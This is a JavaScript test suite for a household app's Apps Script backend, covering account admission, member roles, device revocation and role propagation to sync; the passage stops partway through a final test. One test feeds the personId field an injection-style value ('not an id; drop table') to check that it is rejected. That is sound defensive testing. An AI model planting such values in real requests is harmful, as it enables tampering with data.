import { readdirSync, readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { test, describe, assert, setSuite } from './harness.mjs';
import { backend, loadAppsScript } from './appsscript.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');

setSuite('backend');

/**
 * The Apps Script backend, run in Node against literal stubs.
 *
 * This is the boundary that decides which Google account may reach a
 * household's workbook, and until now it was the only part of this repository
 * with no tests at all — on the grounds that it runs in a different runtime.
 * It runs plain functions over a handful of globals, and a handful of globals
 * is a thing you can supply.
 */

const OWNER = 'owner@example.com';
const SPOUSE = 'spouse@example.com';
const STRANGER = 'someone@elsewhere.com';

const tokens = {
  'owner-token': { email: OWNER, expires_in: '3599' },
  'spouse-token': { email: SPOUSE, expires_in: '3599' },
  'stranger-token': { email: STRANGER, expires_in: '3599' },
  'expired-token': { email: OWNER, expires_in: '0' },
  'anonymous-token': { expires_in: '3599' },
};

const start = (properties) => backend({ owner: OWNER, tokens, properties });

/* ------------------------------------------------------------- admission */

describe('who may reach the backup', () => {
  test('the deploying account is admitted by identity', () => {
    const api = start();
    const caller = api.verifyToken('owner-token');
    assert.equal(caller.email, OWNER);
    assert.ok(caller.isOwner);
  });

  test('an account nobody added is refused, with a reason worth reading', () => {
    const api = start();
    let error;
    try { api.verifyToken('stranger-token'); } catch (err) { error = err; }

    assert.ok(error, 'a stranger was admitted');
    assert.equal(error.status, 403);
    assert.includes(error.message, 'has not been added to this household');
  });

  test('the person an account is is taken from the list, never the request', () => {
    // The identity binding the whole own-record rule rests on. Only the owner
    // can write this list, which is what makes it safe to widen access from —
    // a caller naming the person they are would be a caller claiming somebody
    // else's records.
    const bound = start({
      members: JSON.stringify([{ email: SPOUSE, role: 'spouse', personId: 'p-asha' }]),
    });
    assert.equal(bound.verifyToken('spouse-token').personId, 'p-asha');

    // And an entry written before this existed carries none, which means no
    // own-record access rather than access to everything.
    const older = start({ members: JSON.stringify([{ email: SPOUSE, role: 'spouse' }]) });
    assert.equal(older.verifyToken('spouse-token').personId, '');
  });

  test('an admitted account is let in, and is not an owner', () => {
    // This is the whole bug the list exists to fix: the documented way to add
    // a family member was to sign in with their own Google account, and every
    // sync after that sign-in used to return 403.
    const api = start({ members: JSON.stringify([SPOUSE]) });
    const caller = api.verifyToken('spouse-token');

    assert.equal(caller.email, SPOUSE);
    assert.not(caller.isOwner, 'a member must not be treated as the owner');
  });

  test('the list is matched without regard to case', () => {
    const api = start({ members: JSON.stringify(['Spouse@Example.COM']) });
    assert.equal(api.verifyToken('spouse-token').email, SPOUSE);
  });

  test('a corrupted list refuses everyone but the owner rather than throwing', () => {
    // Failing closed: a properties value somebody hand-edited into nonsense
    // must not become "admit anybody".
    const api = start({ members: 'not json at all' });
    assert.equal(api.verifyToken('owner-token').email, OWNER);
    assert.throws(() => api.verifyToken('spouse-token'), /not been added/);
  });

  test('a request with no token, an expired one, or a rejected one is 401', () => {
    const api = start();
    for (const [token, why] of [['', 'no token'], ['expired-token', 'expired'], ['nonsense', 'rejected']]) {
      let error;
      try { api.verifyToken(token); } catch (err) { error = err; }
      assert.equal(error?.status, 401, why);
    }
  });

  test('a token that does not say whose it is proves nothing', () => {
    let error;
    try { start().verifyToken('anonymous-token'); } catch (err) { error = err; }
    assert.equal(error?.status, 401);
  });
});

/* ----------------------------------------------------------- the cache */

describe('caching an identity must not cache the permission', () => {
  test('a verified token is not re-fetched from Google', () => {
    const api = start({ members: JSON.stringify([SPOUSE]) });
    api.verifyToken('spouse-token');
    const after = api.fetched.length;
    api.verifyToken('spouse-token');

    assert.equal(api.fetched.length, after, 'the token was verified twice over the network');
  });

  test('removing somebody takes effect at once, not when their cache expires', () => {
    // The failure this guards against: a member removed after a sync keeps
    // working for another five minutes because their identity was cached
    // together with the decision to admit them.
    const api = start({ members: JSON.stringify([SPOUSE]) });
    assert.equal(api.verifyToken('spouse-token').email, SPOUSE);

    api.props.setProperty('members', JSON.stringify([]));
    assert.throws(() => api.verifyToken('spouse-token'), /not been added/);
  });
});

/* --------------------------------------------------------- managing it */

describe('managing the list', () => {
  test('the owner can admit somebody', () => {
    const api = start();
    const result = api.manageMembers({ emails: [SPOUSE] },
      { email: OWNER, owner: OWNER, isOwner: true });

    assert.deep(result.members, [{ email: SPOUSE, role: 'guest', personId: '' }]);
    assert.deep(JSON.parse(api.props.getProperty('members')),
      [{ email: SPOUSE, role: 'guest', personId: '' }]);
  });

  test('an unnamed role is guest, never the most privileged one', () => {
    // A typo in a role should narrow what somebody may do, not widen it.
    const api = start();
    const result = api.manageMembers(
      { emails: [{ email: SPOUSE, role: 'archduke' }, { email: STRANGER, role: 'owner' }] },
      { email: OWNER, owner: OWNER, isOwner: true },
    );
    assert.deep(result.members.map((m) => m.role), ['guest', 'guest']);
  });

  test('a role the owner gave is the role that is stored', () => {
    const api = start();
    const result = api.manageMembers(
      { emails: [{ email: SPOUSE, role: 'spouse' }, { email: STRANGER, role: 'child' }] },
      { email: OWNER, owner: OWNER, isOwner: true },
    );
    assert.deep(result.members,
      [{ email: SPOUSE, role: 'spouse', personId: '' },
        { email: STRANGER, role: 'child', personId: '' }]);
  });

  test('the person the owner picked is the person that is stored', () => {
    /*
     * Settings → Household has had a person picker since `ownRecordAllows`
     * existed. The choice travelled to the backend and this function dropped
     * it: the loop built `{ email, role }` and nothing else, so `members()`
     * — which reads `entry.personId` and explains that it is what lets a child
     * reach their own health record — found it absent on every entry ever
     * written. `tests/policy.test.mjs` could not see it, because it builds a
     * context with a personId already in it.
     */
    const api = start();
    api.manageMembers(
      { emails: [{ email: SPOUSE, role: 'spouse', personId: 'per_01ABC' }] },
      { email: OWNER, owner: OWNER, isOwner: true },
    );

    assert.equal(JSON.parse(api.props.getProperty('members'))[0].personId, 'per_01ABC');
    // And it survives the read, which is the half that already worked.
    assert.equal(api.members()[0].personId, 'per_01ABC');
  });

  test('and it reaches the caller context, which is where it is used', () => {
    // The wiring, end to end: picker → stored list → `admit` → `context`.
    // `Sheets.gs` reads `context.personId` and nothing else supplies it.
    const api = start();
    api.manageMembers(
      { emails: [{ email: SPOUSE, role: 'child', personId: 'per_kid' }] },
      { email: OWNER, owner: OWNER, isOwner: true },
    );

    const caller = api.admit(SPOUSE);
    assert.equal(caller.personId, 'per_kid');
    assert.equal(caller.role, 'child');
  });

  test('a personId that is not one is dropped rather than stored', () => {
    // The owner picks from a list, so anything else came from a client that
    // built its own request — and a personId is what *widens* access.
    const api = start();
    api.manageMembers(
      { emails: [{ email: SPOUSE, role: 'spouse', personId: 'not an id; drop table' }] },
      { email: OWNER, owner: OWNER, isOwner: true },
    );

    assert.equal(JSON.parse(api.props.getProperty('members'))[0].personId, '');
  });

  test('the owner can say which person they are, and admit carries it', () => {
    /*
     * The owner is never in the member list — `manageMembers` refuses to store
     * them, so nobody can remove the owner or downgrade their role by editing
     * it. That protection is exactly why their personId needs somewhere else
     * to live, and why `admit` returned '' for them until now.
     */
    const api = start();
    api.manageMembers({ emails: [], ownerPersonId: 'per_owner' },
      { email: OWNER, owner: OWNER, isOwner: true });

    assert.equal(api.admit(OWNER).personId, 'per_owner');
    assert.equal(api.admit(OWNER).isOwner, true);
  });

  test('and a call that does not mention it leaves it alone', () => {
    // A client sending only `emails` must not silently unbind the owner —
    // which, since `sheetPush` began checking, would stop them sending chat.
    const api = start();
    api.manageMembers({ emails: [], ownerPersonId: 'per_owner' },
      { email: OWNER, owner: OWNER, isOwner: true });
    api.manageMembers({ emails: [{ email: SPOUSE, role: 'spouse' }] },
      { email: OWNER, owner: OWNER, isOwner: true });

    assert.equal(api.admit(OWNER).personId, 'per_owner');
  });

  test('and a member cannot set it', () => {
    // It decides whose records the most privileged account may reach.
    const api = start({ members: JSON.stringify([{ email: SPOUSE, role: 'spouse' }]) });
    let error;
    try {
      api.manageMembers({ emails: [], ownerPersonId: 'per_theirs' },
        { email: SPOUSE, owner: OWNER, isOwner: false });
    } catch (err) { error = err; }

    assert.ok(error, 'a member set the owner’s person');
    assert.equal(api.admit(OWNER).personId, '');
  });

  test('a member cannot admit anybody, because that would make them an owner', () => {
    const api = start({ members: JSON.stringify([SPOUSE]) });
    let error;
    try {
      api.manageMembers({ emails: [SPOUSE, STRANGER] },
        { email: SPOUSE, owner: OWNER, isOwner: false });
    } catch (err) { error = err; }

    assert.equal(error?.status, 403);
    assert.deep(JSON.parse(api.props.getProperty('members')), [SPOUSE], 'the list was changed anyway');
    // A deployment written before roles existed still reads, and one written
    // before `personId` existed reads as having none — which means no
    // own-record access rather than access to everything.
    assert.deep(api.members(), [{ email: SPOUSE, role: 'spouse', personId: '' }],
      'and a deployment written before roles existed still reads');
  });

  test('the owner cannot be written into the list', () => {
    // It is admitted by identity. Storing it would invite somebody to remove
    // it, and a household that removed its owner would be locked out of its
    // own workbook with no way back in.
    const api = start();
    const result = api.manageMembers({ emails: [OWNER, SPOUSE] },
      { email: OWNER, owner: OWNER, isOwner: true });

    assert.deep(result.members.map((m) => m.email), [SPOUSE]);
  });

  test('rubbish, duplicates and empties are dropped rather than stored', () => {
    const api = start();
    const result = api.manageMembers(
      { emails: [SPOUSE, SPOUSE, '', 'not-an-address', '  SPOUSE@EXAMPLE.COM '] },
      { email: OWNER, owner: OWNER, isOwner: true },
    );
    assert.deep(result.members.map((m) => m.email), [SPOUSE]);
  });

  test('the list has a ceiling, so one call cannot store a mailing list', () => {
    const api = start();
    const many = Array.from({ length: 200 }, (_, i) => `p${i}@example.com`);
    const result = api.manageMembers({ emails: many },
      { email: OWNER, owner: OWNER, isOwner: true });

    assert.ok(result.members.length <= 50, `stored ${result.members.length}`);
  });

  test('anyone admitted may read the list', () => {
    const api = start({ members: JSON.stringify([SPOUSE]) });
    const result = api.manageMembers({}, { email: SPOUSE, owner: OWNER, isOwner: false });

    assert.deep(result.members, [{ email: SPOUSE, role: 'spouse', personId: '' }]);
    assert.equal(result.owner, OWNER);
    assert.not(result.isOwner);
  });
});

/* ------------------------------------------------------------ the shape */

describe('the request contract', () => {
  test('a rejected request answers with ok:false and a status, not an exception', () => {
    const body = start().post('members', 'stranger-token');
    assert.not(body.ok);
    assert.equal(body.status, 403);
    assert.not(body.retryable, 'a refusal must not be retried forever by the outbox');
  });

  test('an unknown action is a 400 rather than a 500', () => {
    const body = start().post('teleport', 'owner-token');
    assert.not(body.ok);
    assert.equal(body.status, 400);
    assert.includes(body.error, 'unknown action');
  });

  test('a successful call answers with ok:true and the data under `data`', () => {
    const body = start().post('members', 'owner-token');
    assert.ok(body.ok);
    assert.equal(body.data.owner, OWNER);
  });

  test('mail is refused when Gmail.gs was not deployed', () => {
    // A household that would rather not grant the Gmail scope deletes the
    // file. That has to read as a clear refusal, not a reference error.
    const body = start().post('mail', 'owner-token', { query: 'from:zomato.com' });
    assert.not(body.ok);
    assert.equal(body.status, 501);
    assert.includes(body.error, 'Gmail.gs');
  });

  test('opening the deployment in a browser explains itself', () => {
    // What everybody does first when a setup does not work.
    const text = JSON.parse(start().doGet().getContent());
    assert.ok(text.ok);
    assert.includes(text.message, 'POST');
  });
});

/**
 * The device registry — the gate's last unbuilt piece, and a field that was
 * collected and never read.
 *
 * `deviceId` has arrived on every request since the first version of this
 * backend. It was parsed, put on the context, and **never looked at again** —
 * the same shape as every other defect this repository has found, except that
 * this one sits in the layer deciding who may reach a household's records.
 *
 * What it buys: a phone is lost, and today the only remedy is to remove the
 * person from the member list, which also locks out the laptop they still have.
 */
describe('the devices a household has signed in from', () => {
  const PHONE = 'dev_phone';
  const LAPTOP = 'dev_laptop';

  test('a device that calls is registered, with when it was first seen', () => {
    const api = start();
    api.post('ping', 'owner-token', {}, { deviceId: PHONE, clientVersion: '4.1' });

    const { data } = api.post('devices', 'owner-token', { op: 'list' }, { deviceId: PHONE });
    assert.length(data.devices, 1);
    assert.equal(data.devices[0].id, PHONE);
    assert.equal(data.devices[0].clientVersion, '4.1');
    assert.ok(data.devices[0].firstSeenAt, 'no first-seen stamp');
  });

  test('calling again updates it rather than adding a second', () => {
    const api = start();
    api.post('ping', 'owner-token', {}, { deviceId: PHONE, clientVersion: '4.1' });
    api.post('ping', 'owner-token', {}, { deviceId: PHONE, clientVersion: '4.2' });

    const { data } = api.post('devices', 'owner-token', { op: 'list' }, { deviceId: PHONE });
    assert.length(data.devices, 1);
    assert.equal(data.devices[0].clientVersion, '4.2');
  });

  test('a revoked device is refused, and told what to do about it', () => {
    const api = start();
    api.post('ping', 'owner-token', {}, { deviceId: PHONE });
    api.post('ping', 'owner-token', {}, { deviceId: LAPTOP });

    api.post('devices', 'owner-token', { op: 'revoke', deviceId: PHONE }, { deviceId: LAPTOP });

    const refused = api.post('ping', 'owner-token', {}, { deviceId: PHONE });
    assert.not(refused.ok, 'a revoked device was served');
    assert.includes(refused.error, 'signed out by the household owner');
  });

  test('and the other device keeps working, which is the whole point', () => {
    const api = start();
    api.post('ping', 'owner-token', {}, { deviceId: PHONE });
    api.post('ping', 'owner-token', {}, { deviceId: LAPTOP });
    api.post('devices', 'owner-token', { op: 'revoke', deviceId: PHONE }, { deviceId: LAPTOP });

    assert.ok(api.post('ping', 'owner-token', {}, { deviceId: LAPTOP }).ok,
      'revoking one device locked out the other');
  });

  test('a revoked device is refused before its action runs, not after', () => {
    // A revoked device allowed to write and then refused the reply would still
    // have written.
    const api = start();
    api.post('ping', 'owner-token', {}, { deviceId: PHONE });
    api.post('ping', 'owner-token', {}, { deviceId: LAPTOP });
    api.post('devices', 'owner-token', { op: 'revoke', deviceId: PHONE }, { deviceId: LAPTOP });

    const before = api.props.getProperty('members');
    const refused = api.post('members', 'owner-token',
      { members: [{ email: SPOUSE, role: 'spouse' }] }, { deviceId: PHONE });

    assert.not(refused.ok, 'a revoked device wrote');
    assert.equal(api.props.getProperty('members'), before, 'the member list changed');
  });

  test('it can be restored', () => {
    const api = start();
    api.post('ping', 'owner-token', {}, { deviceId: PHONE });
    api.post('ping', 'owner-token', {}, { deviceId: LAPTOP });
    api.post('devices', 'owner-token', { op: 'revoke', deviceId: PHONE }, { deviceId: LAPTOP });
    api.post('devices', 'owner-token', { op: 'restore', deviceId: PHONE }, { deviceId: LAPTOP });

    assert.ok(api.post('ping', 'owner-token', {}, { deviceId: PHONE }).ok, 'restore did nothing');
  });

  test('you cannot revoke the device you are asking from', () => {
    // It would lock you out of the reply to your own request.
    const api = start();
    api.post('ping', 'owner-token', {}, { deviceId: PHONE });
    const refused = api.post('devices', 'owner-token',
      { op: 'revoke', deviceId: PHONE }, { deviceId: PHONE });

    assert.not(refused.ok, 'it revoked the calling device');
    assert.includes(refused.error, 'sign out from it instead');
  });

  test('a person sees their own devices and not somebody else’s', () => {
    const api = start({ members: JSON.stringify([{ email: SPOUSE, role: 'spouse' }]) });
    api.post('ping', 'owner-token', {}, { deviceId: LAPTOP });
    api.post('ping', 'spouse-token', {}, { deviceId: PHONE });

    const mine = api.post('devices', 'spouse-token', { op: 'list' }, { deviceId: PHONE });
    assert.length(mine.data.devices, 1);
    assert.equal(mine.data.devices[0].id, PHONE);

    const theirs = api.post('devices', 'spouse-token',
      { op: 'list', email: OWNER }, { deviceId: PHONE });
    assert.not(theirs.ok, 'a spouse read the owner’s devices');
    assert.equal(theirs.status, 403);
  });

  test('only the owner may sign somebody else out', () => {
    // The ability to sign another person out is the ability to lock them out.
    const api = start({ members: JSON.stringify([{ email: SPOUSE, role: 'spouse' }]) });
    api.post('ping', 'owner-token', {}, { deviceId: LAPTOP });

    const refused = api.post('devices', 'spouse-token',
      { op: 'revoke', email: OWNER, deviceId: LAPTOP }, { deviceId: PHONE });
    assert.not(refused.ok, 'a spouse revoked the owner’s device');

    assert.ok(api.post('ping', 'owner-token', {}, { deviceId: LAPTOP }).ok);
  });

  test('revoking a device that does not exist says so', () => {
    // Silence would read as "done" and leave somebody believing they had
    // signed out a phone they had not.
    const api = start();
    api.post('ping', 'owner-token', {}, { deviceId: LAPTOP });
    const refused = api.post('devices', 'owner-token',
      { op: 'revoke', deviceId: 'dev_never_seen' }, { deviceId: LAPTOP });

    assert.not(refused.ok, 'revoking an unknown device reported success');
    assert.equal(refused.status, 404);
  });

  test('a client that sends no device id still works', () => {
    // Older clients do not send one, and locking them out on an upgrade would
    // be a denial of service dressed as a security improvement.
    const api = start();
    assert.ok(api.post('ping', 'owner-token').ok, 'a client with no device id was refused');
    assert.length(api.post('devices', 'owner-token', { op: 'list' }).data.devices, 0);
  });

  test('the registry cannot grow without limit', () => {
    // A client minting a fresh id per request would otherwise fill the store.
    const api = start();
    for (let i = 0; i < 30; i += 1) {
      api.post('ping', 'owner-token', {}, { deviceId: `dev_${i}` });
    }
    const { data } = api.post('devices', 'owner-token', { op: 'list' });
    assert.ok(data.devices.length <= 20, `${data.devices.length} devices kept`);
  });

  test('it holds nothing about what the device did', () => {
    // The gate: the policy server never holds household records.
    const api = start();
    api.post('ping', 'owner-token', {}, { deviceId: PHONE, clientVersion: '4.1' });
    const { data } = api.post('devices', 'owner-token', { op: 'list' }, { deviceId: PHONE });

    // Updated deliberately when `label` and `named` were added — the point of
    // asserting the exact list is that widening it is a decision somebody makes
    // rather than something that happens. A label is a name for a device, not a
    // record of what it did.
    assert.deep(Object.keys(data.devices[0]).sort(),
      ['acknowledgedAt', 'clientVersion', 'firstSeenAt', 'id', 'label',
        'lastSeenAt', 'named', 'revokedAt']);
  });
});

/**
 * Telling one device from another.
 *
 * The registry worked and was unusable: it asked an owner which of several
 * `dev_01M0…` was the phone they lost. A capability nobody can act on is not a
 * feature.
 */
describe('naming the devices', () => {
  const PHONE = 'dev_phone';
  const LAPTOP = 'dev_laptop';
  const seen = (api, id, label) =>
    api.post('ping', 'owner-token', {}, { deviceId: id, deviceLabel: label });

  test('a device is listed under the name it reported', () => {
    const api = start();
    seen(api, PHONE, 'iPhone · Safari');

    const { data } = api.post('devices', 'owner-token', { op: 'list' }, { deviceId: PHONE });
    assert.equal(data.devices[0].label, 'iPhone · Safari');
    assert.not(data.devices[0].named, 'a reported label is not a chosen one');
  });

  test('the reported name refreshes while nobody has chosen one', () => {
    const api = start();
    seen(api, PHONE, 'iPhone · Safari');
    seen(api, PHONE, 'iPhone · Chrome');

    const { data } = api.post('devices', 'owner-token', { op: 'list' }, { deviceId: PHONE });
    assert.equal(data.devices[0].label, 'iPhone · Chrome');
  });

  test('but never over a name a person typed', () => {
    // Somebody who called their old laptop "the one in the study" should not
    // find it renamed "Mac · Safari" the next time it syncs.
    const api = start();
    seen(api, LAPTOP, 'Mac · Safari');
    api.post('devices', 'owner-token',
      { op: 'name', deviceId: LAPTOP, label: 'the one in the study' }, { deviceId: PHONE });
    seen(api, LAPTOP, 'Mac · Safari');

    const { data } = api.post('devices', 'owner-token', { op: 'list' }, { deviceId: PHONE });
    const laptop = data.devices.find((d) => d.id === LAPTOP);
    assert.equal(laptop.label, 'the one in the study');
    assert.ok(laptop.named);
  });

  test('you may name the device you are using', () => {
    // Unlike revoking it, which would lock you out of your own reply.
    const api = start();
    seen(api, PHONE, 'iPhone · Safari');
    const named = api.post('devices', 'owner-token',
      { op: 'name', deviceId: PHONE, label: 'my phone' }, { deviceId: PHONE });

    assert.ok(named.ok, named.error);
    assert.equal(named.data.devices[0].label, 'my phone');
  });

  test('a name is trimmed and bounded', () => {
    // This is shown in a list; a label the length of a paragraph would push
    // everything else off the screen.
    const api = start();
    seen(api, PHONE, 'iPhone · Safari');
    const named = api.post('devices', 'owner-token',
      { op: 'name', deviceId: PHONE, label: `  ${'x'.repeat(200)}  ` }, { deviceId: PHONE });

    assert.equal(named.data.devices[0].label.length, 60);
  });

  test('clearing the name lets the reported one come back', () => {
    const api = start();
    seen(api, PHONE, 'iPhone · Safari');
    api.post('devices', 'owner-token',
      { op: 'name', deviceId: PHONE, label: 'mine' }, { deviceId: PHONE });
    api.post('devices', 'owner-token',
      { op: 'name', deviceId: PHONE, label: '' }, { deviceId: PHONE });
    seen(api, PHONE, 'iPhone · Chrome');

    const { data } = api.post('devices', 'owner-token', { op: 'list' }, { deviceId: PHONE });
    assert.equal(data.devices[0].label, 'iPhone · Chrome');
  });

  test('only the owner may rename somebody else’s device', () => {
    const api = start({ members: JSON.stringify([{ email: SPOUSE, role: 'spouse' }]) });
    seen(api, LAPTOP, 'Mac · Safari');

    const refused = api.post('devices', 'spouse-token',
      { op: 'name', email: OWNER, deviceId: LAPTOP, label: 'nope' }, { deviceId: PHONE });
    assert.not(refused.ok, 'a spouse renamed the owner’s device');
  });

  test('a device that reports no name is still listed', () => {
    const api = start();
    api.post('ping', 'owner-token', {}, { deviceId: PHONE });
    const { data } = api.post('devices', 'owner-token', { op: 'list' }, { deviceId: PHONE });
    assert.length(data.devices, 1);
    assert.equal(data.devices[0].label, '');
  });
});

/**
 * Saying that something new signed in.
 *
 * The registry could be *read* and never *spoke*. An unrecognised device sat in
 * it until somebody happened to open the screen — which, for the one thing on
 * that screen that matters, is too late to be useful.
 */
describe('a device nobody has vouched for', () => {
  const MINE = 'dev_mine';
  const OTHER = 'dev_other';
  const seen = (api, id) => api.post('ping', 'owner-token', {}, { deviceId: id });

  test('the device in your hand is never counted against you', () => {
    // Otherwise every household is warned about themselves on the day they
    // install this, and learns to ignore the notice before it ever matters.
    const api = start();
    const { data } = seen(api, MINE);
    assert.equal(data.unrecognisedDevices, 0);
  });

  test('a second device is counted, on the next ping from the first', () => {
    const api = start();
    seen(api, MINE);
    seen(api, OTHER);
    assert.equal(seen(api, MINE).data.unrecognisedDevices, 1);
  });

  test('saying you recognise it stops the count', () => {
    const api = start();
    seen(api, MINE);
    seen(api, OTHER);
    api.post('devices', 'owner-token', { op: 'acknowledge', deviceId: OTHER },
      { deviceId: MINE });

    assert.equal(seen(api, MINE).data.unrecognisedDevices, 0);
  });

  test('and so does signing it out', () => {
    // It has been dealt with. Nagging afterwards teaches people to dismiss the
    // notice, which is the opposite of what it is for.
    const api = start();
    seen(api, MINE);
    seen(api, OTHER);
    api.post('devices', 'owner-token', { op: 'revoke', deviceId: OTHER }, { deviceId: MINE });

    assert.equal(seen(api, MINE).data.unrecognisedDevices, 0);
  });

  test('acknowledging is recorded, so the screen can show which are new', () => {
    const api = start();
    seen(api, MINE);
    seen(api, OTHER);
    const after = api.post('devices', 'owner-token',
      { op: 'acknowledge', deviceId: OTHER }, { deviceId: MINE });

    const other = after.data.devices.find((d) => d.id === OTHER);
    assert.ok(other.acknowledgedAt, 'nothing was recorded');
  });

  test('each person is counted their own devices, not the household’s', () => {
    // A spouse signing in on a new phone is not something the owner is warned
    // about here — it is the spouse's own list, and the owner has the member
    // list for the question of who may sync at all.
    const api = start({ members: JSON.stringify([{ email: SPOUSE, role: 'spouse' }]) });
    seen(api, MINE);
    api.post('ping', 'spouse-token', {}, { deviceId: OTHER });

    assert.equal(seen(api, MINE).data.unrecognisedDevices, 0);
  });
});

/* ------------------------------------------------- the identity that arrives */

/**
 * What `doPost` hands the action, rather than what `admit` worked out.
 *
 * The two had drifted. `admit` resolves a role and a person id from the
 * members list the owner controls, and the dispatch context copied neither, so
 * `Sheets.gs` — `(context && context.role) || 'guest'` — authorised every
 * request as a guest. A guest may write nothing and read nothing, so every
 * push was refused row by row for every caller including the owner, and every
 * pull came back empty.
 *
 * It failed closed, so nobody gained access they should not have. What it cost
 * was the off-device copy a household believed it had.
 *
 * Neither existing suite could see it. `policy.test.mjs` calls `sheetPush`
 * with a context it builds itself, role included, and proves the rules are
 * right when handed one. This file drives `doPost` and never pushed. Both ends
 * covered, the wiring between them not — so these go end to end, through the
 * same HTTP-shaped entry point the browser uses.
 */
describe('the identity that reaches the action', () => {
  const HEADERS = ['_id', '_rev', '_updatedAt', '_deletedAt'];
  const ROWS = [['a1', 1, '2026-08-01T00:00:00.000Z', '']];

  /** A workbook that records what was written to it. */
  const book = () => {
    const appended = [];
    const sheet = (name) => ({
      getName: () => name,
      getLastRow: () => ROWS.length + 1,
      getLastColumn: () => HEADERS.length,
      getRange: (row) => ({
        getValues: () => (row === 1 ? [HEADERS] : ROWS),
        setValues: () => {},
        setValue: () => {},
      }),
      appendRow: (row) => appended.push({ sheet: name, row }),
    });
    return {
      appended,
      getSheets: () => ['Accounts'].map(sheet),
      getSheetByName: (name) => (name === 'Accounts' ? sheet(name) : null),
    };
  };

  const household = (members) => {
    const workbook = book();
    const api = backend({
      owner: OWNER,
      tokens,
      files: ['Policy.gs', 'Code.gs', 'Drive.gs', 'Sheets.gs'],
      workbook,
      properties: {
        members: JSON.stringify(members),
        workbookId: 'book-1',
        sheetMap: JSON.stringify({ account: 'Accounts' }),
      },
    });
    return { api, workbook };
  };

  /** The same, with a Health sheet whose rows name the person they are about. */
  const HEALTH_HEADERS = ['_id', '_rev', '_updatedAt', '_deletedAt', 'person'];
  const healthHousehold = (members) => {
    const sheet = (name) => ({
      getName: () => name,
      getLastRow: () => 1,
      getLastColumn: () => HEALTH_HEADERS.length,
      getRange: () => ({
        getValues: () => [HEALTH_HEADERS],
        setValues: () => {},
        setValue: () => {},
      }),
      appendRow: () => {},
    });
    const workbook = {
      getSheets: () => ['Health'].map(sheet),
      getSheetByName: (name) => (name === 'Health' ? sheet(name) : null),
    };
    return {
      workbook,
      api: backend({
        owner: OWNER,
        tokens,
        files: ['Policy.gs', 'Code.gs', 'Drive.gs', 'Sheets.gs'],
        workbook,
        properties: {
          members: JSON.stringify(members),
          workbookId: 'book-1',
          sheetMap: JSON.stringify({ healthRecord: 'Health' }),
        },
      }),
    };
  };

  const pushHealth = (api, token, person) => api.post('push', token, {
    changes: [{
      store: 'healthRecord', op: 'put', recordId: 'h1', rev: 1,
      payload: { id: 'h1', person },
    }],
  }, { deviceId: 'device-1' });

  const pushAccount = (api, token) => api.post('push', token, {
    changes: [{
      store: 'account', op: 'put', recordId: 'a1', rev: 1,
      payload: { id: 'a1', name: 'HDFC' },
    }],
  }, { deviceId: 'device-1' });

  test('a spouse’s push is applied, because the role travels with the request', () => {
    // The regression in one line: with `role` missing from the context this
    // came back rejected with "a guest may not write account".
    const { api } = household([{ email: SPOUSE, role: 'spouse', personId: 'p-asha' }]);
    const result = pushAccount(api, 'spouse-token');

    assert.ok(result.ok, result.error ?? '');
    assert.length(result.data.rejected, 0,
      result.data.rejected[0]?.reason ?? '');
    assert.length(result.data.applied, 1);
  });

  test('and a child’s is refused, so the first test is not passing on a rule that permits everything', () => {
    const { api } = household([{ email: SPOUSE, role: 'child', personId: 'p-kid' }]);
    const result = pushAccount(api, 'spouse-token');

    assert.length(result.data.applied, 0);
    assert.length(result.data.rejected, 1);
    assert.ok(/child may not write account/.test(result.data.rejected[0].reason),
      result.data.rejected[0].reason);
  });

  test('the role in the reply is the one the members list gives, not one the caller sent', () => {
    // `ping` reports `context.role`. Absent it, this key was simply missing —
    // which is how the whole defect was first visible from outside.
    const { api } = household([{ email: SPOUSE, role: 'spouse', personId: 'p-asha' }]);
    const said = api.post('ping', 'spouse-token', {}, { deviceId: 'device-1' });

    assert.equal(said.data.role, 'spouse');
  });

  test('a pull returns rows for a spouse and nothing for a guest', () => {
    const asSpouse = household([{ email: SPOUSE, role: 'spouse', personId: 'p-asha' }]);
    const asGuest = household([{ email: SPOUSE, role: 'guest', personId: 'p-asha' }]);

    const spouseSaw = asSpouse.api.post('pull', 'spouse-token', {}, { deviceId: 'device-1' });
    const guestSaw = asGuest.api.post('pull', 'spouse-token', {}, { deviceId: 'device-1' });

    assert.ok(spouseSaw.ok, spouseSaw.error ?? '');
    assert.ok(guestSaw.ok, guestSaw.error ?? '');

    // Both halves asserted. Only checking that a spouse sees rows would pass
    // against a backend that showed everything to everybody; only checking
    // that a guest sees none would pass against the broken version, where
    // every caller was a guest and nobody saw anything.
    assert.length(spouseSaw.data.records.account ?? [], 1);
    assert.deep(guestSaw.data.records, {});
  });

  test('the person id travels too, so a child may keep their own health record', () => {
    // `ownRecordAllows(personId, …)` widens what a restricted role may write,
    // but only for rows about themselves. A child's role alone may not write
    // healthRecord at all, so this push can only succeed if the *person id*
    // reached the action — which it did not, and asserting on the role would
    // not have noticed: dropping `personId` alone passed all 2,089 tests until
    // this test existed.
    const { api } = healthHousehold([{ email: SPOUSE, role: 'child', personId: 'p-kid' }]);
    const result = pushHealth(api, 'spouse-token', 'p-kid');

    assert.ok(result.ok, result.error ?? '');
    assert.length(result.data.rejected, 0, result.data.rejected[0]?.reason ?? '');
    assert.length(result.data.applied, 1);
  });

  test('and not a sibling’s, so the widening is about the person and not the push', () => {
    const { api } = healthHousehold([{ email: SPOUSE, role: 'child', personId: 'p-kid' }]);
    const result = pushHealth(api, 'spouse-token', 'p-sibling');

    assert.length(result.data.applied, 0);
    assert.length(result.data.rejected, 1);
  });
});

/**
 * The deployment setting, in the three places that describe it.
 *
 * `docs/ARCHITECTURE.md` said the web app runs as the *user accessing*, and
 * drew a security conclusion from it: that each member's Sheets and Drive work
 * happens under their own Google account. The manifest agreed. `docs/SETUP.md`
 * — the only page that tells a household what to click — said **Execute as:
 * Me**, which is the opposite.
 *
 * The setup page was right, and not by a narrow margin:
 * `PropertiesService.getUserProperties()` holds `sheetMap` and the Drive tree,
 * so under "user accessing" every member would read their own empty copy and
 * sync would work for nobody but the owner. A deployment that functions is one
 * deployed as *Me*.
 *
 * A security claim with nothing checking it is how a wrong one survived in the
 * architecture document. This is the check.
 */
describe('the deployment setting is described the same way everywhere', () => {
  const read = (path) => readFileSync(join(ROOT, path), 'utf8');

  test('the manifest deploys as the owner, which is what setup tells you to pick', () => {
    const manifest = JSON.parse(read('apps-script/appsscript.json'));
    assert.equal(manifest.webapp.executeAs, 'USER_DEPLOYING');

    // The words a household actually reads, in the step where they choose.
